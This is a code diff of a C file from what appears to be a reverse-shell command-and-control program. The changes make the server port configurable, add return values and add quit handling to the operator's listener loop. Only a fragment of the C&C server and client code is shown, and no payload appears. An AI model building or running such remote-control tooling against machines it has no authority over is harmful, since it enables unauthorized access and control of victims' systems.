@@ -8,6 +8,8 @@
 
 #include "socket.h"
 #include "commands.h"
+#include "definitions.h"
+#include "externs.h"
 
 /* As this application is a reverse shell style program, the server is the 
 * command and control machine that gets connected back to.
@@ -21,11 +23,11 @@ int start_server(void)
 	struct sockaddr_in address = {
 		.sin_family = AF_INET,
 		.sin_addr.s_addr = INADDR_ANY,
-		.sin_port = htons(CWB_SERVER_PORT)
+		.sin_port = htons(GlobalConfig.server_port)
 	};
 
 	if (bind(socket_descriptor, (struct sockaddr *) &address, sizeof(address)) < 0) {
-		fprintf(stderr, "%s %d\n", "Failed to bind to port: ", CWB_SERVER_PORT);
+		fprintf(stderr, "%s %d\n", "Failed to bind to port: ", GlobalConfig.server_port);
 	}
 	if (listen(socket_descriptor, 10)) {
 		fprintf(stderr, "%s\n", "Listening failed / over 10 waiting connections.");
@@ -55,11 +57,12 @@ int server_handle_conn(int socket_fd)
 		printf("Contact received: %s\n", buf);
 	}
 	do {
-		server_loop(cfd, buf, sizeof(buf));
+		quit = server_loop(cfd, buf, sizeof(buf));
 	} while (!quit);
 
 	close(cfd);
 	close(socket_fd);
+	return 0;
 }
 
 /* server_loop() is to be run from the C&C machine 
@@ -75,6 +78,8 @@ int server_loop(int host_conn, char *buf, size_t buflen)
 	scanf("%s", buf); //assume non-malicious input from own C&C operator...
 	buf[buflen - 1] = '\0';
 	command[0] = parse_command(buf); //not a stack escape, because this frame continues
+	if (command[0] == CMD_QUIT)
+		return -1;
 	int send_status = send(host_conn, command, sizeof(int), 0);
 	if (send_status < 0)
 		printf("%s\n", "Failed to send command over socket.");
@@ -86,6 +91,7 @@ int server_loop(int host_conn, char *buf, size_t buflen)
 			printf("Return response: %s\n", buf);
 		}
 	}
+	return 0;
 }
 
 int startClient(void)
@@ -116,5 +122,5 @@ int startClient(void)
 
 	close(c_fd);
 	free(msg);
-	
+	return 0;
 }
